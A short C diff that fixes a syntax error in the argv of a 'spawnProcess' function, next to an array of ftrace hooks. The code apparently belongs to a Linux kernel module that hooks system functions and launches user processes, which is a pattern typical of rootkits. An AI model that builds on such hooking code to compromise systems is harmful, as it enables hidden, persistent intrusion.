@@ -587,7 +587,7 @@ static struct ftrace_hook hooks[] = {
 static int spawnProcess(char* path) {
 
     int rc;
-	char* argv[] = {path, itoa() NULL};
+	char* argv[] = {path, NULL};
 	static char* envp[] = {
 		"HOME=/",
 		"TERM=linux",
